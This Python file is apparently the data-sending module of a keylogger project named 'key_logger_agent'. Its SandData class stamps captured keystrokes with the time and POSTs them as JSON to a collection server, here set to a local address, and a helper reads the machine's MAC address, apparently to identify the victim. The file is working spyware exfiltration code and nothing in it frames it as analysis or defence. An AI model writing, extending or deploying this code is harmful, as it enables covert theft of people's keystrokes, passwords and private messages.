import datetime
import uuid
import requests

from key_logger_agent.key_encryption import Encryption


class SandData:

    def __init__(self):
        self.url = "http://127.0.0.1:5000"
        self.data = None


    def time(self):
        now = datetime.datetime.now()
        self.now = str(now.strftime("%m-%d-%Y %H:%M "))
        return self.now


    def sand(self, data):
        self.data = {'time': self.time(), 'keys': data}
        try:
            response=requests.post(self.url, json= self.data, timeout= 5 )
            if response.status_code == 200:
                print('worked')
        except Exception as e:
            print(e)










def get_mac_address(self):
    mac = uuid.UUID(int=uuid.getnode()).hex[-12:]
    return ":".join(mac[i: i +2] for i in range(0, 12, 2))
